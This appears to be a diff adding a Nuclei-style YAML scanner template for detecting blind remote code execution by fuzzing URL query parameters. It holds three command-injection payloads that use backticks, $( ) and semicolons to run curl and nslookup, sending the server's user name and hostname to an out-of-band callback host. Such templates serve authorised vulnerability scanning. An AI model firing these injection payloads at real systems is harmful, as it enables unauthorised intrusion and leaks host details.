@@ -1,0 +1,31 @@
+id: bRCE
+
+info: 
+  name: Blind Remote code Execution
+  author: abdulrahman
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      rce:
+        - "curl//{{interactsh-url}}"
+        - "root`nslookup%20$(whoami).{{interactsh-url}}`"
+        - "8.8.8.8;nslookup $(hostname).{{interactsh-url}}"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{rce}}"
+    
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+
